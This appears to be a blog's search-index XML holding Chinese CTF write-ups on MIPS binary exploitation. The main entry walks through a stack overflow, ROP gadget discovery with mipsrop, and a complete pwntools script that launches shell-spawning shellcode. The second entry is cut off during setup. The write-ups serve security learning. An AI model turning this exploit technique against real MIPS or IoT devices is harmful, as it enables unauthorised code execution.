<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PWN-MIPS-mpwn</title>
      <link href="2020/11/23/PWN-MIPS-mpwn/"/>
      <url>2020/11/23/PWN-MIPS-mpwn/</url>
      
        <content type="html"><![CDATA[<p><strong>同样是MIPS架构pwn的入门题（误），尝试做做，看来我离入门还有很长的路要走</strong></p><a id="more"></a><p>首先检查文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/mpwn$ file pwn</span><br><span class="line">pwn: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=e0782ebdf0d70b808dba4b10c6866faeae35c620, not stripped</span><br><span class="line">ssr@ubuntu:~/iot/mpwn$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/ssr/iot/mpwn/pwn&#x27;</span></span><br><span class="line">    Arch:     mips-32-big</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>可以看出是大端的MIPS32架构，没开任何保护，可以直接用<code>qemu-user</code>运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/mpwn$ qemu-mips ./pwn</span><br><span class="line">=== Welcome to visit H4-link! ===</span><br><span class="line">Enter the group number: </span><br></pre></td></tr></table></figure><p>显示要先输入一串。</p><p>用IDA打开分析，首先f5查看main函数伪码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init_0(argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  pwn();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;alloc success!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中banner函数即为输出开始那段welcome字符串，主要函数为pwn函数，其伪码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">pwn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// $v0</span></span><br><span class="line">  _BOOL4 result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+0h] [+0h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">2</span>]; <span class="comment">// [sp+10h] [+10h] BYREF</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+28h] [+28h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+2Ch] [+2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [sp+30h] [+30h]</span></span><br><span class="line">  <span class="keyword">int</span> *v12; <span class="comment">// [sp+34h] [+34h]</span></span><br><span class="line">  <span class="keyword">int</span> *v13; <span class="comment">// [sp+38h] [+38h]</span></span><br><span class="line">  <span class="keyword">int</span> *v14; <span class="comment">// [sp+3Ch] [+3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [sp+40h] [+40h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [sp+44h] [+44h]</span></span><br><span class="line">  _BYTE *v17; <span class="comment">// [sp+48h] [+48h]</span></span><br><span class="line">  <span class="keyword">int</span> v18[<span class="number">3</span>]; <span class="comment">// [sp+4Ch] [+4Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6 = (_BYTE *)<span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter the group number: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v18) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v18[<span class="number">0</span>] || v18[<span class="number">0</span>] &gt;= <span class="number">0xA</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;The numbers is illegal! Exit...\n&quot;</span>, <span class="number">1</span>, <span class="number">32</span>, <span class="built_in">stderr</span>, <span class="number">4883200</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v18[<span class="number">1</span>] = (<span class="keyword">int</span>)&amp;v3;</span><br><span class="line">  v9 = <span class="number">36</span>;</span><br><span class="line">  v10 = <span class="number">36</span> * v18[<span class="number">0</span>];</span><br><span class="line">  v11 = <span class="number">36</span> * v18[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">  v12 = v4;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">36</span> * v18[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i &lt; v18[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v18[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v13 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v12 + i * v9);</span><br><span class="line">    v14 = v13;</span><br><span class="line">    <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter the id and name, separated by `:`, end with `.` . eg =&gt; &#x27;1:Job.&#x27; &quot;</span>);</span><br><span class="line">    v15 = read(<span class="number">0</span>, v6, <span class="number">768</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = atoi(v6);</span><br><span class="line">      *v14 = v0;</span><br><span class="line">      v16 = <span class="built_in">strchr</span>(v6, <span class="number">58</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; v6++; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *v6 == <span class="number">10</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = v6;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v17 = &amp;v5[-v16];</span><br><span class="line">      <span class="keyword">if</span> ( !v16 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;format error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(v14 + <span class="number">1</span>, v16 + <span class="number">1</span>, v17);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">      v14[<span class="number">1</span>] = <span class="number">1633771776</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先存在堆溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v6 = (_BYTE *)<span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">v15=read(<span class="number">0</span>, v6, <span class="number">768</span>);</span><br></pre></td></tr></table></figure><p>此后会将堆上的内容拷贝到栈上，可能发生栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> v4[<span class="number">2</span>]; <span class="comment">// [sp+10h] [+10h] BYREF</span></span><br><span class="line"><span class="keyword">int</span> v16; <span class="comment">// [sp+44h] [+44h]</span></span><br><span class="line">v12 = v4;</span><br><span class="line">v13 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v12 + i * v9);</span><br><span class="line">v14 = v13;</span><br><span class="line">v16 = <span class="built_in">strchr</span>(v6, <span class="number">58</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(v14 + <span class="number">1</span>, v16 + <span class="number">1</span>, v17);</span><br></pre></td></tr></table></figure><p>开始先用<code>qemu-mips -g 1234 ./pwn</code>命令打开远程终端，然后用gdb调试，在终端分别输入1和由<code>“1：”+“a”*x</code>组成的字符串，经过多次测试得当x大于等于90时开始对<code>$ra</code>产生溢出覆盖，所以溢出边界为0x90个字节，具体调试信息如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/mpwn$ gdb-multiarch -q ./pwn</span><br><span class="line">pwndbg: loaded 190 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from ./pwn...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">gdb-peda$ target remote:1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line"></span><br><span class="line">省略开始处断点信息</span><br><span class="line"></span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line"> </span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">0x610a0af4 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> V0   0x0</span><br><span class="line">*V1   0x61616162 (<span class="string">&#x27;aaab&#x27;</span>)</span><br><span class="line">*A0   0x76ffef9e ◂— 0xaf40000</span><br><span class="line">*A1   0x4a2fa4 ◂— 0</span><br><span class="line">*A2   0x2</span><br><span class="line">*A3   0x76ffef9e ◂— 0xaf40000</span><br><span class="line">*T0   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T1   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T2   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T3   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T4   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T5   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T6   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T7   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T8   0x12</span><br><span class="line">*T9   0x76ffee7e ◂— 0xf0340049</span><br><span class="line">*S0   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S1   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S2   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S3   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S4   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S5   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S6   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S7   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S8   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*FP   0x76ffefa0 ◂— 0x0</span><br><span class="line">*SP   0x76ffefa0 ◂— 0x0</span><br><span class="line">*PC   0x610a0af4</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">Invalid address 0x610a0af4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ fp sp  0x76ffefa0 ◂— 0x0</span><br><span class="line">01:0004│        0x76ffefa4 —▸ 0x4012e0 (__libc_csu_init) ◂— addiu  <span class="variable">$sp</span>, <span class="variable">$sp</span>, -0x38</span><br><span class="line">02:0008│        0x76ffefa8 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">04:0010│        0x76ffefb0 —▸ 0x4a8300 ◂— 0</span><br><span class="line">05:0014│        0x76ffefb4 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">07:001c│        0x76ffefbc —▸ 0x400d64 (__libc_start_main+564) ◂— lui    <span class="variable">$t9</span>, 0x40</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0 610a0af4</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gdb-peda$ info reg</span><br><span class="line">          zero       at       v0       v1       a0       a1       a2       a3</span><br><span class="line"> R0   00000000 00000001 00000000 61616162 76ffef9e 004a2fa4 00000002 76ffef9e </span><br><span class="line">            t0       t1       t2       t3       t4       t5       t6       t7</span><br><span class="line"> R8   61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 </span><br><span class="line">            s0       s1       s2       s3       s4       s5       s6       s7</span><br><span class="line"> R16  61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 </span><br><span class="line">            t8       t9       k0       k1       gp       sp       s8       ra</span><br><span class="line"> R24  00000012 76ffee7e 00000000 00000000 61616161 76ffefa0 61616161 610a0af4 </span><br><span class="line">            sr       lo       hi      bad    cause       pc</span><br><span class="line">      20000010 999999a3 00000025 610a0af4 00000000 610a0af4 </span><br><span class="line">           fsr      fir</span><br><span class="line">      00000000 00739300</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此次调试x为91，可以看到<code>$ra</code>头部第一个字节已被覆盖。</p><p>由于没有地方泄露了栈地址，所以需要用ROP来构造指令，在IDA中激活mipsrop插件，应有提示如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MIPS ROP Finder activated, found <span class="number">842</span> controllable jumps between <span class="number">0x00400000</span> <span class="keyword">and</span> <span class="number">0x004740A0</span></span><br></pre></td></tr></table></figure><p>首先用<code>mipsrop.stackfinder()</code>寻找gadget：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  <span class="number">0x004273C4</span>  |  addiu $a2,$sp,<span class="number">0x70</span>+var_C                            |  jalr  $s0                             |</span><br><span class="line">|  <span class="number">0x0042BCD0</span>  |  addiu $a2,$sp,<span class="number">0x88</span>+var_C                            |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0042FA00</span>  |  addiu $v1,$sp,<span class="number">0x138</span>+var_104                         |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x004491F8</span>  |  addiu $a2,$sp,<span class="number">0x44</span>+var_C                            |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x0044931C</span>  |  addiu $v0,$sp,<span class="number">0x30</span>+var_8                            |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x00449444</span>  |  addiu $a2,$sp,<span class="number">0x44</span>+var_C                            |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x0044AD58</span>  |  addiu $a1,$sp,<span class="number">0x60</span>+var_28                           |  jalr  $s4                             |</span><br><span class="line">|  <span class="number">0x0044AEFC</span>  |  addiu $a1,$sp,<span class="number">0x64</span>+var_28                           |  jalr  $s5                             |</span><br><span class="line">|  <span class="number">0x0044B154</span>  |  addiu $a1,$sp,<span class="number">0x6C</span>+var_38                           |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044B1EC</span>  |  addiu $v0,$sp,<span class="number">0x6C</span>+var_40                           |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044B3EC</span>  |  addiu $v0,$sp,<span class="number">0x170</span>+var_130                         |  jalr  $s0                             |</span><br><span class="line">|  <span class="number">0x00454E94</span>  |  addiu $s7,$sp,<span class="number">0xB8</span>+var_98                           |  jalr  $s3                             |</span><br><span class="line">|  <span class="number">0x00465BEC</span>  |  addiu $a1,$sp,<span class="number">0xC4</span>+var_98                           |  jalr  $s0                             |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found <span class="number">13</span> matching gadgets</span><br></pre></td></tr></table></figure><p>以第一个gadget为例<code>addiu $a2,$sp,0x70+var_C  |  jalr  $s0</code>，其中<code>var_C</code>为<code>-0xc</code>，所以这个gadget会将$sp寄存器的值加上0x70-0xc=0x64放到$a2寄存器中，然后跳转到$s0寄存器中的地址执行。所以若可以控制$s0寄存器的值指向一个跳转到$a2的gadget，然后在&amp;sp+0x64的栈地址处布置shellcode即可利用。</p><p>首先要找到跳转到$a2的gadget。由于在mips汇编中，间接跳转通常由$t9寄存器实现，所以尝试搜索命令和结果如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.find(<span class="string">&quot;move $t9,$a2&quot;</span>)</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  <span class="number">0x00421684</span>  |  move $t9,$a2                                        |  jr    $a2                             |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found <span class="number">1</span> matching gadgets</span><br></pre></td></tr></table></figure><p>成功找到该gadget，然后尝试控制$s0寄存器。</p><p>在MIPS复杂函数的序言和尾声中，会保存和恢复s组寄存器，所以查看一下pwn函数的尾声的汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00400A2C                 move    $sp, $fp</span><br><span class="line">.text:00400A30                 lw      $ra, 0x58+var_s24($sp)</span><br><span class="line">.text:00400A34                 lw      $fp, 0x58+var_s20($sp)</span><br><span class="line">.text:00400A38                 lw      $s7, 0x58+var_s1C($sp)</span><br><span class="line">.text:00400A3C                 lw      $s6, 0x58+var_s18($sp)</span><br><span class="line">.text:00400A40                 lw      $s5, 0x58+var_s14($sp)</span><br><span class="line">.text:00400A44                 lw      $s4, 0x58+var_s10($sp)</span><br><span class="line">.text:00400A48                 lw      $s3, 0x58+var_sC($sp)</span><br><span class="line">.text:00400A4C                 lw      $s2, 0x58+var_s8($sp)</span><br><span class="line">.text:00400A50                 lw      $s1, 0x58+var_s4($sp)</span><br><span class="line">.text:00400A54                 lw      $s0, 0x58+var_s0($sp)</span><br><span class="line">.text:00400A58                 addiu   $sp, 0x80</span><br><span class="line">.text:00400A5C                 jr      $ra</span><br><span class="line">.text:00400A60                 nop</span><br><span class="line">.text:00400A60  # End of function pwn</span><br></pre></td></tr></table></figure><p>由于我们之前溢出时在<code>0x90</code>处控制了<code>$ra</code>,则可以在<code>0x90-0x24=0x6c</code>处控制<code>$s0</code></p><p>在函数的尾声处会将栈空间回收，即为上面代码块<code>.text:00400A58</code>处 ,可以构造输入使在<code>$ra</code>处用跳转到<code>$s0</code>的gadget覆盖，在<code>$s0</code>用跳转到<code>$a2</code>的gadget覆盖，并在溢出点后0x64位处拼接shellcode即可，完整的脚本如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;big&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&quot;qemu-mips&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;number:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">g_to_a2=<span class="number">0x00421684</span></span><br><span class="line">g_to_s0=<span class="number">0x004273C4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;1:&#x27;</span> + <span class="number">0x6c</span>*<span class="string">&#x27;a&#x27;</span> + p32(g_to_a2) </span><br><span class="line">payload+= <span class="number">0x20</span>*<span class="string">&#x27;a&#x27;</span> + p32(g_to_s0)</span><br><span class="line">payload+= <span class="number">0x64</span>*<span class="string">&#x27;a&#x27;</span> + asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Job.&#x27;&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Pwn-MIPS-Mplogin</title>
      <link href="2020/11/21/Pwn-MIPS-Mplogin/"/>
      <url>2020/11/21/Pwn-MIPS-Mplogin/</url>
      
        <content type="html"><![CDATA[<p><strong>从MIPS入手IOT逆向，先学习一两道题热身，思路主要来源是学长的博客，记录下写题的过程，系统是Ubuntu16.04</strong></p><a id="more"></a><p>首先检查文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/Mplogin$ file Mplogin</span><br><span class="line">Mplogin: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line">ssr@ubuntu:~/iot/Mplogin$ checksec Mplogin</span><br><span class="line">[!] Could not populate PLT: Invalid memory write (UC_ERR_WRITE_UNMAPPED)</span><br><span class="line">[*] <span class="string">&#x27;/home/ssr/iot/Mplogin/Mplogin&#x27;</span></span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出是小端的MIPS32架构，没开任何保护</p><p>这里需要使用模拟器QEMU的User模式运行，安装命令为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu qemu-user qemu-user-static</span><br></pre></td></tr></table></figure><p>因为是小端mips，所以使用qemu-mipsel模拟，命令和反馈为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/Mplogin$ qemu-mipsel -L ./ Mplogin</span><br><span 